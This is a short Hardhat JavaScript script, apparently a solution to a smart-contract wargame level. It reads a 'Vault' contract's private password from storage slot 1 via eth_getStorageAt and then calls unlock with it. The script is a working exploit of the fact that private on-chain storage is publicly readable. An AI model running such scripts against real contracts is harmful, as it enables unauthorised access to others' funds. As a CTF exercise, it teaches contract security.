const hre = require("hardhat");

function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}

async function main() {
  const [owner] = await ethers.getSigners();
  const contractAddress = hre.ethers.utils.getAddress(
    "0x8e104eD49BC07d00B183Ea066Ef92B5b9B530D1E"
  );
  const Contract = await hre.ethers.getContractFactory("Vault");
  const contractInstance = await Contract.attach(contractAddress);

  console.log(contractInstance.functions);

  // use hit and trial to get storage location of the password

  const password = await hre.network.provider.send("eth_getStorageAt", [
    contractAddress,
    "0x01",
  ]);

  console.log("getstorage 1:", hre.ethers.utils.toUtf8String(password));

  await contractInstance.connect(owner).unlock(password);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
